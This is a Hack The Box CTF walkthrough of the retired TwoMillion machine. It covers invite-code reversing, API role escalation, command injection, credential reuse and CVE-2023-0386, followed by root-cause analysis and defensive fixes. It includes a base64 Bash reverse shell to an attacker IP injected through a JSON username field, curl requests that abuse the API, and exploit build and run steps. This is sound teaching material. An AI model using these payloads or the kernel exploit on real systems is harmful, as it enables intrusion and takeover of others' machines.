---
title: "Hack The Box: TwoMillion Writeup"
author: sh1nn
date: 2026-02-21
tags:
  - hackthebox
  - twomillion
  - ctf
  - web-security
  - api-security
  - command-injection
  - linux
  - privilege-escalation
description: "A technical walkthrough of Hack The Box TwoMillion, covering invite-code generation, authenticated API enumeration, broken authorization, command injection, credential reuse, and CVE-2023-0386."
cover: /images/2million.png
draft: false
toc: true
---

<!--
HƯỚNG DẪN ẢNH TRƯỚC KHI ĐĂNG BLOG

1. Nên đặt toàn bộ ảnh của bài trong:
   public/images/twomillion/

2. Nên đổi tên ảnh ngắn, không dấu, không khoảng trắng:
   01-nmap-scan.png
   02-invite-page.png
   03-invite-script-source.png
   ...

3. Mẫu chèn ảnh Markdown chuẩn:
   ![Mô tả ảnh](/images/twomillion/01-nmap-scan.png)

4. Mẫu chèn ảnh có giới hạn chiều rộng bằng HTML:
   <img src="/images/twomillion/04-deobfuscated-javascript.png"
        alt="Deobfuscated invite JavaScript"
        width="760">

5. Mẫu chèn ảnh có chú thích:
   <figure>
     <img src="/images/twomillion/16-root-shell.png"
          alt="Root shell after exploiting CVE-2023-0386">
     <figcaption>Root access confirmed with the id command.</figcaption>
   </figure>

6. Nếu framework của bạn không dùng thư mục public/, hãy sửa phần đường dẫn ảnh
   cho phù hợp với Hugo page bundle, Astro assets hoặc cấu trúc dự án hiện tại.

GỢI Ý ĐỔI TÊN ẢNH CŨ

Screenshot 2026-07-14 at 14.03.34.png -> 01-nmap-scan.png
Screenshot 2026-07-14 at 14.38.25.png -> 02-invite-page.png
Screenshot 2026-07-14 at 14.40.05.png -> 03-invite-script-source.png
Screenshot 2026-07-14 at 14.41.17.png -> 04-deobfuscated-javascript.png
Screenshot 2026-07-14 at 14.54.20.png -> 05-invite-instructions.png
Screenshot 2026-07-14 at 14.58.55.png -> 06-generated-invite-code.png
Screenshot 2026-07-14 at 15.08.21.png -> 07-registration.png
Screenshot 2026-07-14 at 15.16.20.png -> 08-session-cookie.png
Screenshot 2026-07-14 at 15.22.41.png -> 09-api-routes.png
Screenshot 2026-07-14 at 15.35.01.png -> 10-admin-escalation.png
Screenshot 2026-07-14 at 15.41.26.png -> 11-command-injection.png
Screenshot 2026-07-14 at 15.51.43.png -> 12-reverse-shell.png
Screenshot 2026-07-14 at 15.53.50.png -> 13-env-credentials.png
Screenshot 2026-07-14 at 16.02.23.png -> 14-ssh-admin.png
Screenshot 2026-07-14 at 16.44.29.png -> 15-local-mail.png
Screenshot 2026-07-14 at 16.46.23.png -> 16-kernel-version.png
Screenshot 2026-07-14 at 16.48.44.png -> 17-os-release.png
Ảnh root shell mới -> 18-root-shell.png
-->

# Hack The Box: TwoMillion Writeup

> **Machine:** TwoMillion  
> **Operating system:** Linux  
> **Difficulty:** Easy  
> **Main techniques:** JavaScript deobfuscation, API enumeration, broken authorization, OS command injection, credential reuse, and Linux kernel privilege escalation.

> **Legal notice:** This writeup applies only to the retired Hack The Box machine and systems where testing is explicitly authorized.

## Overview

TwoMillion recreates an older version of the Hack The Box platform. The attack begins by reversing the invite-code workflow, continues through an authenticated API authorization flaw, and ends with a Linux kernel exploit.

```text
JavaScript deobfuscation
        ↓
Invite-code generation
        ↓
Authenticated API enumeration
        ↓
Broken authorization
        ↓
Administrative API access
        ↓
OS command injection
        ↓
Shell as www-data
        ↓
Credentials recovered from .env
        ↓
SSH access as admin
        ↓
CVE-2023-0386
        ↓
Root shell
```

The key lesson is that several individually simple weaknesses can be chained into a complete system compromise.

## What You Will Learn

- How to inspect and deobfuscate client-side JavaScript.
- How to enumerate an authenticated REST API.
- How changes in API error messages can reveal request requirements.
- How broken function-level authorization can expose administrative actions.
- How unsafe shell command construction leads to command injection.
- How credential reuse enables lateral movement.
- How to validate and exploit a vulnerable Linux kernel in a controlled lab.

## 1. Initial Enumeration

### 1.1 Nmap scan

Start with a default script and service-version scan:

```bash
nmap -sC -sV -Pn 10.129.5.245
```

The scan identifies SSH on port 22 and HTTP on port 80. The web server redirects requests to `2million.htb`.

<!--
ẢNH CẦN CHÈN:
- Nội dung: Kết quả Nmap thể hiện port 22, port 80 và redirect tới 2million.htb.
- Tên file gợi ý: 01-nmap-scan.png
- Định dạng đang dùng: Markdown chuẩn.
-->

![Nmap service and version scan](/images/twomillion/01-nmap-scan.png)

Add the virtual host to `/etc/hosts`:

```bash
echo '10.129.5.245 2million.htb' | sudo tee -a /etc/hosts
```

### 1.2 Web application review

Opening `http://2million.htb` reveals an older version of the Hack The Box platform. The site provides login and registration functionality, but registration requires an invite code.

<!--
ẢNH CẦN CHÈN:
- Nội dung: Trang invite hoặc giao diện cũ của Hack The Box.
- Tên file gợi ý: 02-invite-page.png
-->

![TwoMillion invite page](/images/twomillion/02-invite-page.png)

The invite page is available at:

```text
http://2million.htb/invite
```

## 2. Reverse Engineering the Invite Workflow

### 2.1 Inspecting the page source

The invite page loads an obfuscated JavaScript file:

```html
<script defer src="/js/inviteapi.min.js"></script>
```

<!--
ẢNH CẦN CHÈN:
- Nội dung: DevTools hoặc page source thể hiện inviteapi.min.js.
- Tên file gợi ý: 03-invite-script-source.png
-->

![Invite page source loading inviteapi.min.js](/images/twomillion/03-invite-script-source.png)

![Deobfuscate script](/images/twomillion/04-deobfuscated-javascript.png)

After formatting or deobfuscating the script, two useful functions become visible:

```javascript
function verifyInviteCode(code) {
  const formData = { code: code };

  $.ajax({
    type: "POST",
    dataType: "json",
    data: formData,
    url: "/api/v1/invite/verify",
    success: function (response) {
      console.log(response);
    },
    error: function (response) {
      console.log(response);
    },
  });
}

function makeInviteCode() {
  $.ajax({
    type: "POST",
    dataType: "json",
    url: "/api/v1/invite/how/to/generate",
    success: function (response) {
      console.log(response);
    },
    error: function (response) {
      console.log(response);
    },
  });
}
```

<!--
ẢNH CẦN CHÈN:
- Nội dung: JavaScript sau khi deobfuscate.
- Tên file gợi ý: 04-deobfuscated-javascript.png
- Định dạng đang dùng: HTML để giới hạn chiều rộng.
-->

<img src="/images/twomillion/04-deobfuscated-javascript.png"
     alt="Deobfuscated invite API JavaScript"
     width="760">

The second function reveals the following endpoint:

```http
POST /api/v1/invite/how/to/generate
```

Client-side code is always visible to the user. Obfuscation may reduce readability, but it does not protect API routes or application logic.

### 2.2 Requesting invite-generation instructions

Send a POST request to the discovered endpoint:

```bash
curl -sX POST \
  http://2million.htb/api/v1/invite/how/to/generate | jq
```

<!--
ẢNH CẦN CHÈN:
- Nội dung: JSON trả về, gồm trường data và enctype ROT13.
- Tên file gợi ý: 05-invite-instructions.png
-->

![Invite-generation instructions returned by the API](/images/twomillion/how-to-generate.png)

The response contains a ROT13-encoded message. It can be decoded locally:

![Decode ROT13](/images/twomillion/decode-rot13.png)

The decoded message instructs us to send a POST request to:

```http
POST /api/v1/invite/generate
```

### 2.3 Generating the invite code

Request a new invite code:

```bash
curl -sX POST \
  http://2million.htb/api/v1/invite/generate | jq
```

The returned code is Base64-encoded. Decode it with:

```bash
curl -sX POST \
  http://2million.htb/api/v1/invite/generate \
  | jq -r '.data.code' \
  | base64 -d
```

<!--
ẢNH CẦN CHÈN:
- Nội dung: Kết quả API trả về code Base64 và kết quả sau khi decode.
- Tên file gợi ý: 06-generated-invite-code.png
-->

![Generated and decoded invite code](/images/twomillion/decode-base64.png)

Submit the decoded value on `/invite`, then register a normal user account.

<!--
ẢNH CẦN CHÈN:
- Nội dung: Form đăng ký sau khi invite code được chấp nhận.
- Tên file gợi ý: 07-registration.png
-->

![TwoMillion account registration](/images/twomillion/07-registration.png)

## 3. Authenticated API Enumeration

### 3.1 Capturing the session cookie

After logging in, the application creates a PHP session cookie named `PHPSESSID`. Capture it with Burp Suite or the browser developer tools.

<!--
ẢNH CẦN CHÈN:
- Nội dung: Request có Cookie: PHPSESSID=...
- Che hoặc thay session thật bằng giá trị giả nếu bài được đăng công khai.
- Tên file gợi ý: 08-session-cookie.png
-->

![PHP session cookie captured in Burp Suite](/images/twomillion/08-session-cookie.png)

The site's **Access** page downloads a VPN configuration through an authenticated API request similar to:

```http
GET /api/v1/user/vpn/generate HTTP/1.1
Host: 2million.htb
Cookie: PHPSESSID=<SESSION_ID>
```

This confirms that the application exposes an authenticated API under `/api/v1`.

### 3.2 Discovering available routes

Request the API root while supplying the session cookie:

```bash
curl -s \
  http://2million.htb/api/v1 \
  --cookie 'PHPSESSID=<SESSION_ID>' | jq
```

<!--
ẢNH CẦN CHÈN:
- Nội dung: Danh sách route user và admin.
- Tên file gợi ý: 09-api-routes.png
-->

![API v1 route listing](/images/twomillion/09-api-routes.png)

The response exposes both user and administrative endpoints, including:

```text
GET  /api/v1/admin/auth
POST /api/v1/admin/vpn/generate
PUT  /api/v1/admin/settings/update
```

Publishing a complete route list makes reconnaissance easier, but endpoint secrecy is not an access-control mechanism. Every administrative route must enforce authorization independently.

### 3.3 Confirming the current role

Check whether the current account is an administrator:

```bash
curl -s \
  http://2million.htb/api/v1/admin/auth \
  --cookie 'PHPSESSID=<SESSION_ID>' | jq
```

The response confirms that the account is currently a normal user:

```json
{
  "message": false
}
```

## 4. Escalating the Web Account to Administrator

### 4.1 Probing the settings endpoint

The route listing shows that `/api/v1/admin/settings/update` expects a `PUT` request. Start with an empty request:

```bash
curl -sX PUT \
  http://2million.htb/api/v1/admin/settings/update \
  --cookie 'PHPSESSID=<SESSION_ID>' | jq
```

Instead of returning `401 Unauthorized`, the endpoint complains about the content type. This indicates that the request reached the handler even though the account is not an administrator.

Set the expected content type:

```bash
curl -sX PUT \
  http://2million.htb/api/v1/admin/settings/update \
  --cookie 'PHPSESSID=<SESSION_ID>' \
  -H 'Content-Type: application/json' | jq
```

The API reports a missing `email` parameter. Supplying the email reveals another required field named `is_admin`.

```bash
curl -sX PUT \
  http://2million.htb/api/v1/admin/settings/update \
  --cookie 'PHPSESSID=<SESSION_ID>' \
  -H 'Content-Type: application/json' \
  -d '{"email":"<YOUR_EMAIL>"}' | jq
```

### 4.2 Modifying the role

Send both required values and set `is_admin` to the integer `1`:

```bash
curl -sX PUT \
  http://2million.htb/api/v1/admin/settings/update \
  --cookie 'PHPSESSID=<SESSION_ID>' \
  -H 'Content-Type: application/json' \
  -d '{"email":"<YOUR_EMAIL>","is_admin":1}' | jq
```

<!--
ẢNH CẦN CHÈN:
- Nội dung: Request update role và JSON trả về is_admin: 1.
- Có thể gộp ảnh update role và ảnh admin/auth trả về true thành một ảnh.
- Tên file gợi ý: 10-admin-escalation.png
-->

![Normal account promoted to administrator](/images/twomillion/10-admin-escalation.png)

Verify the new role:

```bash
curl -s \
  http://2million.htb/api/v1/admin/auth \
  --cookie 'PHPSESSID=<SESSION_ID>' | jq
```

Expected response:

```json
{
  "message": true
}
```

The normal account has now been promoted to administrator through broken function-level authorization.

## 5. Foothold Through Command Injection

### 5.1 Testing the administrative VPN endpoint

The administrative VPN endpoint requires a `username` parameter:

```bash
curl -sX POST \
  http://2million.htb/api/v1/admin/vpn/generate \
  --cookie 'PHPSESSID=<SESSION_ID>' \
  -H 'Content-Type: application/json' \
  -d '{"username":"test"}'
```

A normal value returns an OpenVPN configuration. This suggests that the username is used while generating or reading a file on the operating system.

### 5.2 Confirming command execution

Test whether shell metacharacters are interpreted:

```bash
curl -sX POST \
  http://2million.htb/api/v1/admin/vpn/generate \
  --cookie 'PHPSESSID=<SESSION_ID>' \
  -H 'Content-Type: application/json' \
  -d '{"username":"test;id;"}'
```

<!--
ẢNH CẦN CHÈN:
- Nội dung: Response có uid=33(www-data).
- Tên file gợi ý: 11-command-injection.png
-->

![Command injection confirmed with the id command](/images/twomillion/11-command-injection.png)

The response includes:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirms OS command injection as the `www-data` user. The issue maps to **CWE-78: Improper Neutralization of Special Elements Used in an OS Command**.

### 5.3 Receiving a reverse shell

Start a listener on the attacking machine:

```bash
nc -lvnp 4444
```

Generate a Base64-encoded Bash reverse-shell payload:

```bash
echo -n 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' | base64 -w 0
```

Build the JSON body with `jq` to avoid malformed quoting:

```bash
PAYLOAD='<BASE64_PAYLOAD>'

jq -n \
  --arg username "test;echo $PAYLOAD | base64 -d | bash;" \
  '{username: $username}' > body.json
```

Send the request:

```bash
curl -sX POST \
  http://2million.htb/api/v1/admin/vpn/generate \
  --cookie 'PHPSESSID=<SESSION_ID>' \
  -H 'Content-Type: application/json' \
  --data @body.json
```

<!--
ẢNH CẦN CHÈN:
- Nội dung: Terminal listener nhận được shell và lệnh id xác nhận www-data.
- Tên file gợi ý: 12-reverse-shell.png
-->

![Reverse shell received as www-data](/images/twomillion/12-reverse-shell.png)

The listener receives a shell as `www-data`.

## 6. Lateral Movement to the `admin` User

### 6.1 Reading the application environment file

The web root contains a `.env` file:

```bash
cd /var/www/html
ls -la
cat .env
```

<!--
ẢNH CẦN CHÈN:
- Nội dung: File .env và các biến DB_USERNAME, DB_PASSWORD.
- Tên file gợi ý: 13-env-credentials.png
-->

![Application environment file containing database credentials](/images/twomillion/13-env-credentials.png)

The file contains database credentials:

```text
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

Check whether a local operating-system account named `admin` exists:

```bash
getent passwd admin
```

Result:

```text
admin:x:1000:1000::/home/admin:/bin/bash
```

### 6.2 Password reuse

The database password is reused by the local `admin` account. From the attacking machine, connect over SSH:

```bash
ssh admin@2million.htb
```

Use the password recovered from `.env`, then verify the account:

```bash
id
cat ~/user.txt
```

<!--
ẢNH CẦN CHÈN:
- Nội dung: SSH thành công, id của admin và vị trí user flag.
- Không cần hiển thị nguyên flag.
- Tên file gợi ý: 14-ssh-admin.png
-->

![SSH access as the admin user](/images/twomillion/14-ssh-admin.png)

The main weakness is not simply that the application reads a `.env` file. The compromise becomes possible because the same credential is reused for a local operating-system account.

## 7. Linux Privilege Escalation

### 7.1 Reading local mail

Inspect the local mailbox:

```bash
cat /var/mail/admin
```

<!--
ẢNH CẦN CHÈN:
- Nội dung: Email nhắc tới OverlayFS, FUSE và kernel exploits.
- Tên file gợi ý: 15-local-mail.png
-->

![Local mail hinting at an OverlayFS and FUSE vulnerability](/images/twomillion/15-local-mail.png)

The message warns about recent Linux kernel vulnerabilities and specifically references OverlayFS and FUSE. This is a strong hint toward **CVE-2023-0386**.

### 7.2 Checking the kernel and distribution

Enumerate the running kernel:

```bash
uname -a
```

<!--
ẢNH CẦN CHÈN:
- Nội dung: uname -a với kernel 5.15.70-051570-generic.
- Tên file gợi ý: 16-kernel-version.png
-->

![Linux kernel version enumeration](/images/twomillion/16-kernel-version.png)

Check the distribution release:

```bash
lsb_release -a
```

<!--
ẢNH CẦN CHÈN:
- Nội dung: Ubuntu 22.04.2 LTS, codename jammy.
- Tên file gợi ý: 17-os-release.png
-->

![Ubuntu Jammy release information](/images/twomillion/17-os-release.png)

Relevant system information:

```text
Kernel: 5.15.70-051570-generic
Distribution: Ubuntu 22.04.2 LTS
Codename: jammy
```

The local mail, kernel version, and distribution release together justify investigating CVE-2023-0386.

### 7.3 Preparing the proof of concept

On the attacking machine, clone and compress the proof of concept:

```bash
git clone https://github.com/xkaneiki/CVE-2023-0386.git
zip -r cve.zip CVE-2023-0386
```

Upload it through SSH:

```bash
scp cve.zip admin@2million.htb:/tmp/
```

On the target:

```bash
cd /tmp
unzip cve.zip
cd CVE-2023-0386
make all
```

Compiler warnings may be displayed, but the required binaries should still be produced in the HTB lab environment.

### 7.4 Running the exploit

Start the FUSE component in the background:

```bash
./fuse ./ovlcap/lower ./gc &
```

Run the exploit binary:

```bash
./exp
```

Verify the effective user:

```bash
id
```

Expected result:

```text
uid=0(root) gid=0(root) groups=0(root),1000(admin)
```

Read the root flag:

```bash
cat /root/root.txt
```

<!--
ẢNH BẮT BUỘC CẦN BỔ SUNG:
- Nội dung: ./exp chạy thành công và id trả về uid=0(root).
- Không hiển thị nguyên root flag.
- Tên file gợi ý: 18-root-shell.png
- Định dạng đang dùng: figure + figcaption để minh họa kiểu chèn ảnh có chú thích.
-->
<figure>
  <img src="/images/twomillion/18-root-shell.png"
       alt="Root shell obtained after exploiting CVE-2023-0386">
  <figcaption>Root access confirmed after exploiting CVE-2023-0386.</figcaption>
</figure>

## 8. Post-Exploitation Root-Cause Analysis

> The following source snippets are included as post-exploitation analysis based on the official walkthrough. They explain why the observed behavior occurred; they were not required to be available during the initial exploitation process.

### 8.1 Broken authorization

The vulnerable controller performs an authorization check similar to:

```php
$isAdmin = $this->is_admin($router);

if (!$isAdmin) {
    return header("HTTP/1.1 401 Unauthorized");
}
```

However, `is_admin()` returns JSON instead of a Boolean:

```php
return json_encode(["message" => false]);
```

The returned value is a non-empty string:

```text
{"message":false}
```

In PHP, a non-empty string is truthy. Therefore, `!$isAdmin` evaluates to `false`, and execution continues even though the JSON message says the user is not an administrator.

A safer design separates authorization logic from HTTP response formatting:

```php
private function currentUserIsAdmin(): bool
{
    // Return only true or false.
}
```

The controller should reject access before parsing or processing attacker-controlled request data.

### 8.2 OS command injection

The vulnerable code builds a shell command with untrusted input:

```php
$output = shell_exec(
    "/usr/bin/cat /var/www/html/VPN/user/$username.ovpn"
);
```

If `username` contains a shell separator such as `;`, the shell interprets the remaining text as another command.

The primary fix is to avoid invoking a shell:

```php
$path = "/var/www/html/VPN/user/" . $safeUsername . ".ovpn";
$output = file_get_contents($path);
```

A strict allowlist can be added as defense in depth:

```regex
^[A-Za-z0-9_-]{1,32}$
```

Input validation alone is not a substitute for removing the shell invocation.

## 9. Optional Post-Root Puzzle

<details>
<summary>Decoding thank_you.json</summary>

The root directory also contains `thank_you.json`:

```bash
cat /root/thank_you.json
```

The data is nested through several transformation layers:

```text
URL encoding
      ↓
Hex encoding
      ↓
Base64 encoding
      ↓
XOR encryption with key: HackTheBox
```

A CyberChef recipe is:

```text
URL Decode
From Hex
From Base64
XOR (key: HackTheBox, UTF-8)
```

<!--
ẢNH TÙY CHỌN:
- Nội dung: CyberChef recipe hoặc plaintext cuối cùng.
- Chỉ nên chèn nếu phần Post-Root được giữ lại.
- Tên file gợi ý: 19-post-root-puzzle.png
-->

![CyberChef recipe for decoding thank_you.json](/images/twomillion/19-post-root-puzzle.png)

URL encoding, hexadecimal, and Base64 are reversible encodings. XOR uses a key and is an encryption operation, although repeating-key XOR is not suitable for protecting sensitive data.

</details>

## 10. Vulnerability Summary

| Stage                | Weakness                                          | Impact                                 | Classification                            |
| -------------------- | ------------------------------------------------- | -------------------------------------- | ----------------------------------------- |
| Invite workflow      | Client-callable invite-generation workflow        | Account registration                   | Insecure design / reconnaissance exposure |
| Role escalation      | Authorization helper returns a truthy JSON string | Normal user becomes administrator      | Broken Function Level Authorization       |
| VPN generation       | Untrusted username reaches `shell_exec()`         | Remote command execution as `www-data` | CWE-78                                    |
| Lateral movement     | Database credentials reused for a local account   | SSH access as `admin`                  | Credential reuse                          |
| Privilege escalation | Vulnerable Linux kernel                           | Root access                            | CVE-2023-0386                             |

## 11. Defensive Recommendations

### Enforce authorization at the controller boundary

Authorization helpers should return strict Boolean values. Every administrative endpoint must reject unauthorized users before parsing request data.

```php
if (!$auth->currentUserIsAdmin()) {
    http_response_code(403);
    exit;
}
```

### Avoid shell execution

Do not use `shell_exec()`, `system()`, or `exec()` when the same operation can be implemented with native file APIs. Where process execution is unavoidable, pass arguments without invoking a shell and apply strict allowlist validation.

### Separate credentials

Use different credentials for database services, SSH accounts, and application users. Store secrets with the minimum required permissions and rotate them after exposure.

### Patch the operating system

Kernel vulnerabilities can convert a limited service compromise into full system control. Apply security updates, reboot into the patched kernel, and verify the active kernel version after maintenance.

### Reduce unnecessary information exposure

Avoid publishing internal route inventories and verbose production error messages. This does not replace authorization, but it reduces unnecessary reconnaissance information.

## 12. Conclusion

TwoMillion demonstrates how a complete compromise can emerge from several small weaknesses: exposed client-side workflow logic, broken API authorization, command injection, credential reuse, and an outdated kernel.

The most useful testing habit from this machine is to pay attention to changing error messages. A different response can reveal required headers, parameters, data types, and whether a supposedly protected handler is still processing the request.

## References

- [CVE-2023-0386 proof of concept by xkaneiki](https://github.com/xkaneiki/CVE-2023-0386)
- [OWASP API Security — Broken Function Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/)
- [CWE-78 — Improper Neutralization of Special Elements Used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
- Hack The Box official TwoMillion walkthrough
